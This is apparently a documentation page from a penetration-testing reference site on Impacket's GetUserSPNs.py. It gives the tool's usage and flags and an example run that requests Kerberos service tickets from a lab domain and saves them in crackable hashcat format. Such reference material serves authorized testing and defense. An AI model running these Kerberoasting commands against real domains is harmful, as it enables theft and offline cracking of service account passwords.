---
title : "GetUserSPNs.py"
# pre : ' '
description : "Queries target domain for SPNs that are running under a user account (kerberoasting)."
date : 2022-02-14T12:20:24+01:00
# hidden : true
# draft : true
weight : 0
tags : ['Kerberoasting']
---

## GetUserSPNs.py

"Queries target domain for SPNs that are running under a user account (kerberoasting).

### Installation

Install the [Impacket Framework]({{< ref "../" >}})

### Usage

```plain
GetUserSPNs.py [-h] [-target-domain TARGET_DOMAIN] [-usersfile USERSFILE] [-request] [-request-user username] [-save] [-outputfile OUTPUTFILE] [-debug] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address] target
```

### Flags

```plain
Impacket v0.10.1.dev1+20220504.120002.d5097759 - Copyright 2022 SecureAuth Corporation

Queries target domain for SPNs that are running under a user account

positional arguments:
  target                domain/username[:password]

optional arguments:
  -h, --help            show this help message and exit
  -target-domain TARGET_DOMAIN
                        Domain to query/request if different than the domain of the user. Allows for Kerberoasting across trusts.
  -usersfile USERSFILE  File with user per line to test
  -request              Requests TGS for users and output them in JtR/hashcat format (default False)
  -request-user username
                        Requests TGS for the SPN associated to the user specified (just the username, no domain needed)
  -save                 Saves TGS requested to disk. Format is <username>.ccache. Auto selects -request
  -outputfile OUTPUTFILE
                        Output filename to write ciphers in JtR/hashcat format
  -debug                Turn DEBUG output ON

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)
  -dc-ip ip address     IP Address of the domain controller. If ommited it use the domain part (FQDN) specified in the target parameter. Ignoredif -target-domain is specified.
```

### Examples

```plain
$ GetUserSPNs.py -target-domain offsec.nl -request -outputfile out.log -dc-ip 10.10.10.10 offsec.nl/normal-user
Impacket v0.9.22.dev1+20200611.111621.760cb1ea - Copyright 2020 SecureAuth Corporation

Password:
ServicePrincipalName               Name               MemberOf                                                              PasswordLastSet             LastLogon                   Delegation
---------------------------------  -----------------  --------------------------------------------------------------------  --------------------------  --------------------------  ----------
SRV2016-DC/DC01.offsec.nl         DC01 [REDACTED]

$ cat out.log
$krb5tgs$23$*[REDACTED]
```

### URL list

* [Github.com](https://github.com/SecureAuthCorp/impacket)
